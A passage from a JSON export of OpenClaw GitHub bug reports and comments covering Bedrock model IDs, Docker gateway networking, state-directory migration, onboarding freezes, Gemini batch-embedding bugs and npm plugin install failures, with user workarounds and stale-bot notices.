          "body": "I'm also experiencing this issue with AWS Bedrock.\n\n**Environment:**\n- OpenClaw version: 2026.2.1\n- OS: macOS 15.7.3 (arm64)\n\n**What I tried:**\n1. Direct model ID: `amazon-bedrock/anthropic.claude-opus-4-5-20251101-v1:0`\n   - Error: `Invocation of model ID anthropic.claude-opus-4-5-20251101-v1:0 with on-demand throughput isn't supported. Retry your request with the ID or ARN of an inference profile that contains this model.`\n\n2. Global inference profile: `amazon-bedrock/global.anthropic.claude-opus-4-5-20251101-v1:0`\n   - Error: `Unknown model: amazon-bedrock/global.anthropic.claude-opus-4-5-20251101-v1:0`\n\n3. Manually edited `models.json` to use `global.anthropic.claude-opus-4-5-20251101-v1:0` as the model ID\n   - Still fails with \"Unknown model\" because OpenClaw's internal model registry doesn't recognize inference profile IDs\n\n**Workaround:**\nCurrently using `amazon-bedrock/anthropic.claude-3-5-sonnet-20241022-v2:0` which still supports direct invocation without inference profiles.\n\n**Impact:**\nThis blocks using any Claude 4.x or 4.5 models via Bedrock, which is a significant limitation for users who want to use the latest models."
        },
        {
          "id": 3844035193,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5290#issuecomment-3844035193",
          "createdAt": "2026-02-03T22:25:21Z",
          "updatedAt": "2026-02-03T22:25:21Z",
          "author": "sentience",
          "body": "Yep, I got it working with manual edits to my openclaw.json:\n\n```json\n{\n  ⋮\n  \"models\": {\n    \"providers\": {\n      \"amazon-bedrock\": {\n        \"baseUrl\": \"https://bedrock-runtime.us-west-2.amazonaws.com\",\n        \"api\": \"bedrock-converse-stream\",\n        \"auth\": \"aws-sdk\",\n        \"models\": [\n          {\n            \"id\": \"us.anthropic.claude-opus-4-5-20251101-v1:0\",\n            \"name\": \"Claude Opus 4.5 (Bedrock)\",\n            \"reasoning\": true,\n            \"input\": [\"text\", \"image\"],\n            \"cost\": { \"input\": 0, \"output\": 0, \"cacheRead\": 0, \"cacheWrite\": 0 },\n            \"contextWindow\": 200000,\n            \"maxTokens\": 8192\n          }\n        ]\n      }\n    }\n  },\n  \"agents\": {\n    \"defaults\": {\n      ⋮\n      \"model\": {\n        \"primary\": \"amazon-bedrock/us.anthropic.claude-opus-4-5-20251101-v1:0\"\n      },\n      \"models\": {\n        \"amazon-bedrock/us.anthropic.claude-opus-4-5-20251101-v1:0\": {}\n      }\n    }\n  },\n  ⋮\n}\n```"
        },
        {
          "id": 3882019273,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5290#issuecomment-3882019273",
          "createdAt": "2026-02-11T04:12:03Z",
          "updatedAt": "2026-02-11T04:12:03Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5559,
      "title": "[Bug]: Docker manual setup fails - CLI cannot reach gateway due to network configuration",
      "body": "## Summary\nThe manual Docker setup documented at https://docs.openclaw.ai/install/docker fails with multiple issues that prevent the CLI from connecting to the gateway and the web UI from working properly.\n\n## Steps to reproduce\n1. Follow the manual Docker setup instructions at https://docs.openclaw.ai/install/docker\n2. Run `docker compose up -d openclaw-gateway`\n3. Run `docker compose run --rm openclaw-cli status`\n4. Observe: `Gateway unreachable (connect failed: connect ECONNREFUSED 127.0.0.1:18789)`\n\n## Root cause\nThe `docker-compose.yml` file has the `openclaw-cli` and `openclaw-gateway` services in separate containers. Both share the same config volume which has `gateway.mode=local` and `gateway.bind=loopback`. This causes the CLI to try connecting to `127.0.0.1:18789`, which is the CLI container's own loopback interface, not the gateway container.\n\n## Expected behavior\nThe CLI should be able to communicate with the gateway container out of the box.\n\n## Actual behavior\n- CLI cannot connect to gateway: `connect ECONNREFUSED 127.0.0.1:18789`\n- Web UI shows repeated `unauthorized` and `closed before connect` errors in gateway logs\n- Manual workarounds required to make it work\n\n## Additional issues encountered\n1. **Token mismatch**: The onboarding process creates a token in `openclaw.json` that differs from `OPENCLAW_GATEWAY_TOKEN` in `.env`, causing authentication failures\n2. **Permissions issues**: Files created during onboarding are owned by the wrong user, requiring manual `sudo chown -R 1000:1000 ~/.openclaw` (related to #5450)\n3. **Web UI pairing**: Even after fixing connectivity and token, web UI requires manual device pairing approval via CLI (which is blocked by issue #1)\n\n## Workaround\nAdd `network_mode: \"service:openclaw-gateway\"` to the `openclaw-cli` service in `docker-compose.yml`:\n\n```yaml\n  openclaw-cli:\n    image: ${OPENCLAW_IMAGE:-openclaw:local}\n    environment:\n      # ... existing env vars ...\n    volumes:\n      - ${OPENCLAW_CONFIG_DIR}:/home/node/.openclaw\n      - ${OPENCLAW_WORKSPACE_DIR}:/home/node/.openclaw/workspace\n    network_mode: \"service:openclaw-gateway\"  # <- ADD THIS LINE\n    stdin_open: true\n    tty: true\n    init: true\n    entrypoint: [\"node\", \"dist/index.js\"]\n```\n\n## Suggested fixes\n1. Update `docker-compose.yml` with the network_mode fix\n2. Ensure onboarding flow synchronizes the gateway token between `.env` and `openclaw.json`\n3. Improve documentation about device pairing requirements for web UI\n4. Consider auto-pairing the web UI when using the tokenized dashboard URL\n\n## Environment\n- OS: Linux 5.15.0-161-generic (x64)\n- Docker Compose: v2\n- OpenClaw version: 2026.1.29\n\n## Related issues\n- #5450 (permissions issues)\n- #4941 (pairing required in Docker)\n- #2178 (improve Docker setup)",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5559",
      "createdAt": "2026-01-31T16:58:00Z",
      "updatedAt": "2026-02-11T04:11:53Z",
      "author": "gerrywastaken",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "web-ui",
          "onboarding",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3829427404,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5559#issuecomment-3829427404",
          "createdAt": "2026-01-31T21:50:54Z",
          "updatedAt": "2026-01-31T21:50:54Z",
          "author": "JaydenLiang",
          "body": "Hi @gerrywastaken , I issued a PR to carry out the exact `network_mode: \"service:openclaw-gateway\"` feature. additionally, making the CLI container depend on the gateway increase the system reliability"
        },
        {
          "id": 3875635391,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5559#issuecomment-3875635391",
          "createdAt": "2026-02-10T06:35:03Z",
          "updatedAt": "2026-02-10T06:35:03Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3881054121,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5559#issuecomment-3881054121",
          "createdAt": "2026-02-10T22:21:32Z",
          "updatedAt": "2026-02-10T22:21:32Z",
          "author": "gerrywastaken",
          "body": "Anybody wanting to keep this open please do so as after this I won't be pinging the above bot to keep things open. There were too many issues with the docker method so I cracked out a laptop I wasn't using, put a fresh linux on it and ran that instead. Much better experience and if they docker method isn't supported it should just be removed instead of wasting everybody's time."
        }
      ]
    },
    {
      "number": 5573,
      "title": "[Bug]: MacOS app Health Check just continually pending",
      "body": "## Summary\n\nMacOS companion app continues to say Health Check Pending or Running.\n(Memory unavailable? Node service not installed?)\nI am able to chat with the bot just fine. This worked under the original Clawdbot so I am worried something is not healthy.\n\n<img width=\"198\" height=\"61\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c9e3bdda-a681-431d-9219-91e3a08b8591\" />\n\n<img width=\"199\" height=\"49\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/6add2ca3-e0ed-4cde-b48b-b2ea7ccc81dc\" />\n\n## Steps to reproduce\n\n1. Open preferences\n2. Look at Health Check\n3. Click Retry\n4. goto Step 2\n\n## Expected behavior\n\nGreen light\n\n## Actual behavior\n\nGray light, never changes\n\n## Environment\n\n- Clawdbot version: 2026.1.30\n- OS:MacOS\n- Install method (pnpm/npx/docker/etc): Mac app download and cli version \n\n## Logs or screenshots\n\n~/.openclaw ❯ lsof -nP -iTCP:18789 -sTCP:LISTEN                                                                                                                       12:24:02 PM\nCOMMAND  PID    USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME\nnode    7713 eoporto   15u  IPv4 0x488160fb52c9759c      0t0  TCP 127.0.0.1:18789 (LISTEN)\nnode    7713 eoporto   16u  IPv6 0xc3d37e6650a501e6      0t0  TCP [::1]:18789 (LISTEN)\n~/.openclaw ❯ openclaw status                                                                                                                                         11:30:23 AM\n\n🦞 OpenClaw 2026.1.30 (76b5208) — I'm the assistant your terminal demanded, not the one your sleep schedule requested.\n\n(node:8156) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.\n(Use `node --trace-deprecation ...` to show where the warning was created)\n│\n◇  \n│\n◇  \nOpenClaw status\n\nOverview\n┌─────────────────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐\n│ Item            │ Value                                                                                                                                                       │\n├─────────────────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤\n│ Dashboard       │ http://127.0.0.1:18789/                                                                                                                                     │\n│ OS              │ macos 26.2 (arm64) · node 25.5.0                                                                                                                            │\n│ Tailscale       │ off                                                                                                                                                         │\n│ Channel         │ stable (default)                                                                                                                                            │\n│ Update          │ pnpm · npm latest 2026.1.30                                                                                                                                 │\n│ Gateway         │ local · ws://127.0.0.1:18789 (local loopback) · reachable 57ms · auth none · Ernies-Mac-mini.localdomain (192.168.1.50) app unknown macos 26.2              │\n│ Gateway service │ LaunchAgent installed · loaded · running (pid 7713, state active)                                                                                           │\n│ Node service    │ LaunchAgent not installed                                                                                                                                   │\n│ Agents          │ 1 · 1 bootstrapping · sessions 3 · default main active 22m ago                                                                                              │\n│ Memory          │ enabled (plugin memory-core) · unavailable                                                                                                                  │\n│ Probes          │ skipped (use --deep)                                                                                                                                        │\n│ Events          │ none                                                                                                                                                        │\n│ Heartbeat       │ 1h (main)                                                                                                                                                   │\n│ Sessions        │ 3 active · default claude-opus-4-5 (200k ctx) · ~/.openclaw/agents/main/sessions/sessions.json                                                              │\n└─────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘\n\nSecurity audit\nSummary: 1 critical · 0 warn · 1 info\n  CRITICAL Gateway auth missing on loopback\n    gateway.bind is loopback but no gateway auth secret is configured. If the Control UI is exposed through a reverse proxy, unauthenticated access is possible.\n    Fix: Set gateway.auth (token recommended) or keep the Control UI local-only.\nFull report: openclaw security audit\nDeep probe: openclaw security audit --deep\n\nChannels\n┌──────────┬─────────┬────────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐\n│ Channel  │ Enabled │ State  │ Detail                                                                                                                                          │\n├──────────┼─────────┼────────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤\n│ Discord  │ ON      │ OK     │ token config (MTQ2…6z8A · len 72) · accounts 1/1                                                                                                │\n└──────────┴─────────┴────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘\n\nSessions\n┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┬────────┬─────────┬─────────────────┬────────────────┐\n│ Key                                                                                                                     │ Kind   │ Age     │ Model           │ Tokens         │\n├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────┼─────────┼─────────────────┼────────────────┤\n│ agent:main:main                                                                                                         │ direct │ 22m ago │ claude-opus-4-5 │ 71k/200k (35%) │\n│ agent:main:cron:f77a1f53-f6b2-4…                                                                                        │ direct │ 3h ago  │ claude-opus-4-5 │ 18k/200k (9%)  │\n│ agent:main:cron:d09c1924-cb09-4…                                                                                        │ direct │ 4h ago  │ claude-opus-4-5 │ 50k/200k (25%) │\n└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴────────┴─────────┴─────────────────┴────────────────┘\n\nFAQ: https://docs.openclaw.ai/faq\nTroubleshooting: https://docs.openclaw.ai/troubleshooting\n\nNext steps:\n  Need to share?      openclaw status --all\n  Need to debug live? openclaw logs --follow\n  Need to test channels? openclaw status --deep\n~/.openclaw ❯   \n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5573",
      "createdAt": "2026-01-31T17:33:59Z",
      "updatedAt": "2026-02-11T04:11:51Z",
      "author": "shokk",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "macos",
          "docker"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3875635095,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5573#issuecomment-3875635095",
          "createdAt": "2026-02-10T06:34:58Z",
          "updatedAt": "2026-02-10T06:34:58Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3878321758,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5573#issuecomment-3878321758",
          "createdAt": "2026-02-10T15:06:54Z",
          "updatedAt": "2026-02-10T15:06:54Z",
          "author": "shokk",
          "body": "This bug is still there in 2026.2.9"
        }
      ]
    },
    {
      "number": 5631,
      "title": "bug: state dir migration leaves hardcoded .clawdbot paths in sessions.json",
      "body": "## Summary\n\nThe state directory migration from `~/.clawdbot` to `~/.openclaw` doesn't update hardcoded paths in `sessions.json`, causing the old directory to be recreated on every message.\n\n## Steps to Reproduce\n\n1. Migrate from old clawdbot installation to openclaw\n2. Delete `~/.clawdbot` directory\n3. Send a message to trigger session write\n4. `~/.clawdbot/agents/main/sessions/` is recreated with new session files\n\n## Root Cause\n\n`~/.openclaw/agents/main/sessions/sessions.json` contains hardcoded `sessionFile` paths:\n\n```json\n{\n  \"agent:main:main\": {\n    \"sessionFile\": \"/Users/username/.clawdbot/agents/main/sessions/xxx.jsonl\",\n    ...\n  }\n}\n```\n\nThe migration moves the file itself but doesn't rewrite the paths inside.\n\n## Expected Behavior\n\nMigration should:\n1. Copy/move `sessions.json` to new location ✅ (already works)\n2. Rewrite all `sessionFile` paths to point to `~/.openclaw` ❌ (missing)\n3. Copy/move session JSONL files to new location\n\n## Workaround\n\n```bash\n# Backup\ncp ~/.openclaw/agents/main/sessions/sessions.json ~/.openclaw/agents/main/sessions/sessions.json.backup\n\n# Fix paths\nsed 's|~/.clawdbot/|~/.openclaw/|g' ~/.openclaw/agents/main/sessions/sessions.json > /tmp/sessions_fixed.json\nmv /tmp/sessions_fixed.json ~/.openclaw/agents/main/sessions/sessions.json\n\n# Move session files\nmv ~/.clawdbot/agents/main/sessions/*.jsonl* ~/.openclaw/agents/main/sessions/\n\n# Clean up\nrm -rf ~/.clawdbot\n```\n\n## Impact\n\n- Users repeatedly delete `.clawdbot` thinking migration is incomplete\n- Session files split across two directories\n- Confusing when troubleshooting\n\n## Suggested Fix\n\nAdd path rewriting to the migration logic in `openclaw doctor` or initial migration:\n\n```typescript\n// Pseudo-code\nconst sessionsJson = readJson(newSessionsPath);\nfor (const [key, session] of Object.entries(sessionsJson)) {\n  if (session.sessionFile?.includes('/.clawdbot/')) {\n    session.sessionFile = session.sessionFile.replace('/.clawdbot/', '/.openclaw/');\n  }\n}\nwriteJson(newSessionsPath, sessionsJson);\n```\n\n## Environment\n\n- OS: macOS 15.2 (arm64)\n- OpenClaw version: 2026.1.30\n- Migrated from: clawdbot (legacy)\n",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5631",
      "createdAt": "2026-01-31T19:09:54Z",
      "updatedAt": "2026-02-11T04:11:47Z",
      "author": "regalstreak",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3829713008,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5631#issuecomment-3829713008",
          "createdAt": "2026-02-01T00:03:03Z",
          "updatedAt": "2026-02-01T00:03:03Z",
          "author": "iwahbe",
          "body": "I recently hit the same issue moving my bot to a different system user. I'd rather that `sessions.json` contained relative paths, that way you could just rename session directories and have it \"just work\"."
        },
        {
          "id": 3875634382,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5631#issuecomment-3875634382",
          "createdAt": "2026-02-10T06:34:44Z",
          "updatedAt": "2026-02-10T06:34:44Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3876235199,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5631#issuecomment-3876235199",
          "createdAt": "2026-02-10T08:51:32Z",
          "updatedAt": "2026-02-10T08:51:32Z",
          "author": "iwahbe",
          "body": "I see no reason to believe that this has been closed."
        }
      ]
    },
    {
      "number": 5730,
      "title": "[Bug]: Waking up skips to shell completition and freezes shell",
      "body": "## Summary\n\nI ran the following command to install `openclaw` on a remote instance:\n\n```\ncurl -fsSL https://openclaw.ai/install.sh | bash\n```\n\nWhen asked to fill in the prompt after \"Wake up, my friend!\", typing or pasting anything in prints in the following:\n\n```\n◇  Install shell completion script?\n│  No\n```\n\nThis results in the shell freezing, effectively killing the shell.\n\n## Steps to reproduce\n\n1. Install `openclaw` via the script\n2. Run `openclaw onboard`\n3. Reach the prompt after waking up the bot, and try typing/pasting something in.\n\n## Expected behavior\n\nI expected to be able to paste my response in.\n\n## Actual behavior\n\nThe program froze, effectively crashing my shell.\n\n## Environment\n\n- Clawdbot version: `2026.1.30 (76b5208)`\n- OS: `Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)`\n- Install method (pnpm/npx/docker/etc): `curl -fsSL https://openclaw.ai/install.sh | bash`\n- Terminal: ghostty\n\n## Logs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n\n<img width=\"1728\" height=\"204\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20269610-e744-4793-88ec-dd0a4346249e\" />",
      "state": "open",
      "comments": 5,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5730",
      "createdAt": "2026-01-31T22:11:37Z",
      "updatedAt": "2026-02-11T04:11:41Z",
      "author": "RodrigoVillar",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "onboarding"
        ]
      },
      "commentsData": [
        {
          "id": 3830096513,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5730#issuecomment-3830096513",
          "createdAt": "2026-02-01T02:17:59Z",
          "updatedAt": "2026-02-01T02:17:59Z",
          "author": "NateSmyth",
          "body": "yeah it runs await runTui() but just returns immediately"
        },
        {
          "id": 3831660385,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5730#issuecomment-3831660385",
          "createdAt": "2026-02-01T18:16:11Z",
          "updatedAt": "2026-02-01T18:16:11Z",
          "author": "cahya-wirawan",
          "body": "I have the same issue. tried to install few times, doesn't help. "
        },
        {
          "id": 3831740480,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5730#issuecomment-3831740480",
          "createdAt": "2026-02-01T18:41:50Z",
          "updatedAt": "2026-02-01T18:43:09Z",
          "author": "cahya-wirawan",
          "body": "I think we get this issue if we run the installation remotely without graphical user interface. Because the installation try to run openclaw-gateway that use graphical user interface. There is no problem if I run directly with graphical UI."
        },
        {
          "id": 3839397207,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5730#issuecomment-3839397207",
          "createdAt": "2026-02-03T06:46:54Z",
          "updatedAt": "2026-02-03T06:46:54Z",
          "author": "blackeyming",
          "body": "me too, so weak"
        },
        {
          "id": 3882018454,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5730#issuecomment-3882018454",
          "createdAt": "2026-02-11T04:11:40Z",
          "updatedAt": "2026-02-11T04:11:40Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5774,
      "title": "[Bug]: Gemini batch embeddings: state parsing + file download broken — memory never indexes",
      "body": "# Clawdbot Bug Report — Gemini Batch Embeddings\n\n**Version:** 2026.1.24-3 (885167d)  \n**Component:** Memory subsystem — Gemini batch embeddings  \n**File:** `dist/memory/batch-gemini.js`  \n**Severity:** Critical — memory indexing is completely non-functional when using Gemini batch embeddings  \n**Impact:** All users on the Gemini batch embedding path are affected. Memory never loads, causing the agent to generate incoherent/gibberish output due to empty context.\n\n---\n\n## Bug 1 — Batch state parsing reads wrong JSON path and uses wrong enum values\n\n### Description\n\nThe polling loop that waits for a Gemini batch to complete never resolves. It reads the batch state from the wrong location in the API response and compares it against incorrect enum values, causing every batch to appear permanently stuck in `UNKNOWN` status.\n\n### Root Cause\n\nTwo compounding errors in `waitForGeminiBatch`:\n\n**Error A — Wrong JSON path:**  \nThe code reads `status.state`, but the Gemini API returns the state nested under `status.metadata.state`. This always resolves to `undefined`, which falls through to the default value `\"UNKNOWN\"`.\n\n```javascript\n// Before (broken)\nconst state = status.state ?? \"UNKNOWN\";\n\n// After (fixed)\nconst state = status.metadata?.state ?? status.state ?? (status.done ? \"DONE\" : \"UNKNOWN\");\n```\n\n**Error B — Wrong enum values:**  \nThe success and failure checks compare against short enum values (`SUCCEEDED`, `FAILED`, etc.), but the Gemini API returns prefixed values (`BATCH_STATE_SUCCEEDED`, `BATCH_STATE_FAILED`, etc.). Neither list ever matches, so the loop runs indefinitely.\n\n```javascript\n// Before (broken)\nif ([\"SUCCEEDED\", \"COMPLETED\", \"DONE\"].includes(state)) { ... }\nif ([\"FAILED\", \"CANCELLED\", \"CANCELED\", \"EXPIRED\"].includes(state)) { ... }\n\n// After (fixed)\nif ([\"SUCCEEDED\", \"COMPLETED\", \"DONE\", \"BATCH_STATE_SUCCEEDED\"].includes(state)) { ... }\nif ([\"FAILED\", \"CANCELLED\", \"CANCELED\", \"EXPIRED\", \"BATCH_STATE_FAILED\", \"BATCH_STATE_CANCELLED\"].includes(state)) { ... }\n```\n\nThe same enum fix was also needed in `runGeminiEmbeddingBatches` where it checks `batchInfo.state` for early exit and completion conditions (two additional occurrences).\n\n### Additional note\n\nThe API also returns a top-level `done: true` boolean when a batch is finished. This is currently ignored by the code and could serve as a simpler fallback check.\n\n---\n\n## Bug 2 — Batch output file download uses wrong URL format\n\n### Description\n\nOnce a batch completes successfully, downloading the output file fails with a 400 error. The embeddings are computed but can never be retrieved, so the memory index silently falls back to non-batch mode (which may also fail or be slower).\n\n### Error\n\n```\n400 { \"error\": { \"code\": 400, \"message\": \"?alt=media should be set for file download.\", \"status\": \"INVALID_ARGUMENT\" } }\n```\n\n### Root Cause\n\nThe download URL is constructed using a `:download` suffix, but Google's Files API requires `?alt=media` as a query parameter to return file content.\n\n```javascript\n// Before (broken)\nconst downloadUrl = `${baseUrl}/${file}:download`;\n\n// After (fixed)\nconst downloadUrl = `${baseUrl}/${file}?alt=media`;\n```\n\n---\n\n## Bug 3 — Broken syntax introduced by sed patches (minor, introduced during hotfixing)\n\n### Description\n\nWhen patching Bug 1 via `sed` with line-number targeting, the line numbers shifted due to prior edits. The patches landed on wrong lines and corrupted three `throw new Error(...)` calls and one `params.debug?.(...)` call by stripping the opening parenthesis before the template literal.\n\n### Note\n\nThis was introduced during the manual hotfix process and is not a bug in the upstream code. It is included here for completeness in case others attempt similar sed-based patches — use unique string matching rather than line-number targeting when patching minified/compiled JS.\n\n---\n\n## Reproduction Steps\n\n1. Install Clawdbot 2026.1.24-3\n2. Configure a Gemini API key as the embedding provider\n3. Run `clawdbot memory index --force --verbose`\n4. Observe polling loop stuck on `UNKNOWN` status indefinitely (Bug 1)\n5. If Bug 1 is patched, observe `400 ?alt=media` error on batch completion (Bug 2)\n\n## Environment\n\n- Node.js on Ubuntu (AWS EC2)\n- Gemini API key: confirmed valid (direct API calls succeed)\n- Embedding model: `gemini-embedding-001`\n- Batch provider: `gemini`\n\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5774",
      "createdAt": "2026-01-31T23:40:29Z",
      "updatedAt": "2026-02-11T04:11:38Z",
      "author": "bastero",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3844676580,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5774#issuecomment-3844676580",
          "createdAt": "2026-02-04T01:12:17Z",
          "updatedAt": "2026-02-04T01:12:17Z",
          "author": "IvoDimitrovPro",
          "body": "same here\n"
        },
        {
          "id": 3882018373,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5774#issuecomment-3882018373",
          "createdAt": "2026-02-11T04:11:38Z",
          "updatedAt": "2026-02-11T04:11:38Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5780,
      "title": "[Bug]: Installing extensions from NPM always fails",
      "body": "## Summary\n\nTrying to install extensions like Discord and Matrix will always fail when picking the `@openclaw/matrix` option to download from NPM. `npm install` for the extensions fails because of the dev dependency workspace. `pnpm install` also won't work because it has no path back to the whole repo, since the extension was downloaded separately.\n\nThe work around is to manually remove the dev dependency entry and run `npm i`\n\nI've tried git bisecting but no release since 2026.1.24 has worked with this extension install method.\n\nProbable cause of #5292 and #1839 \n\n## Steps to reproduce\n\n1. Run the initial onboarding\n2. Try to install a channel/plugin like Discord or Matrix\n3. Pick the download from NPM option\n\n## Expected behavior\n\nThe extension to install correctly\n\n## Actual behavior\n\nFails to install dependencies\n\n## Environment\n\n- Clawdbot version: 2026.1.24 - 2026.1.30 (and main)\n- OS: Tested on Ubuntu 24.04, Docker, and macOS\n- Install method (pnpm/npx/docker/etc): pnpm and Docker\n\n## Logs or screenshots\n\n```\n◇  Select a channel\n│  Matrix (plugin)\n│\n◇  Install Matrix plugin?\n│  Download from npm (@openclaw/matrix)\nDownloading @openclaw/matrix…\nExtracting /tmp/openclaw-npm-pack-yYve44/openclaw-matrix-2026.1.29.tgz…\nInstalling to /home/node/.openclaw/extensions/matrix…\nInstalling plugin dependencies…\n│\n◇  Plugin install ──────────────────────────────────────────╮\n│                                                           │\n│  Failed to install @openclaw/matrix: npm install failed:  │\n│                                                           │\n├───────────────────────────────────────────────────────────╯\nPlugin install failed: npm install failed:\n```\n",
      "state": "open",
      "comments": 6,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5780",
      "createdAt": "2026-01-31T23:46:57Z",
      "updatedAt": "2026-02-11T04:11:36Z",
      "author": "joshuafhiggins",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "macos",
          "linux",
          "docker"
        ],
        "components": [
          "onboarding"
        ]
      },
      "commentsData": [
        {
          "id": 3830509864,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5780#issuecomment-3830509864",
          "createdAt": "2026-02-01T07:13:16Z",
          "updatedAt": "2026-02-01T07:13:16Z",
          "author": "PinguIntel",
          "body": "Getting the same issue. Running on 24.04 in a VM."
        },
        {
          "id": 3830563015,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5780#issuecomment-3830563015",
          "createdAt": "2026-02-01T07:55:22Z",
          "updatedAt": "2026-02-01T07:55:22Z",
          "author": "BLACK4585",
          "body": "@joshuafhiggins Are you using over (P)NPM or GIT?\n> The work around is to manually remove the dev dependency entry and run npm i\n\nWhich dependency and where?"
        },
        {
          "id": 3831201235,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5780#issuecomment-3831201235",
          "createdAt": "2026-02-01T15:24:15Z",
          "updatedAt": "2026-02-01T15:24:51Z",
          "author": "Anas099X",
          "body": "same issue here too but for installing openclaw in general"
        },
        {
          "id": 3831487885,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5780#issuecomment-3831487885",
          "createdAt": "2026-02-01T17:22:55Z",
          "updatedAt": "2026-02-01T17:23:29Z",
          "author": "joshuafhiggins",
          "body": "> [@joshuafhiggins](https://github.com/joshuafhiggins) Are you using over (P)NPM or GIT?\n> \n> > The work around is to manually remove the dev dependency entry and run npm i\n> \n> Which dependency and where?\n\nNPM. Inside of `extensions/matrix/package.json` (or any of the extensions) there is: \n```\n\"devDependencies\": {\n  \"openclaw\": \"workspace:*\"\n}\n```\n\n`npm` can't parse it but `pnpm` does and also fails because it can't find the root of the monorepo it refers to. Running with `--omit=dev` also doesn't fix this because `npm` and `pnpm` parse to make sure the `package.json` is valid regardless."
        },
        {
          "id": 3875633200,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5780#issuecomment-3875633200",
          "createdAt": "2026-02-10T06:34:22Z",
          "updatedAt": "2026-02-10T06:34:22Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3878795134,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5780#issuecomment-3878795134",
          "createdAt": "2026-02-10T15:52:35Z",
          "updatedAt": "2026-02-10T15:52:35Z",
          "author": "rmetcalfe-msp",
          "body": "same issue installing msteams plugin"
        }
      ]
    },
    {
      "number": 5782,
      "title": "TUI: Stale model display after config.patch + missing reply text for Telegram-routed messages",
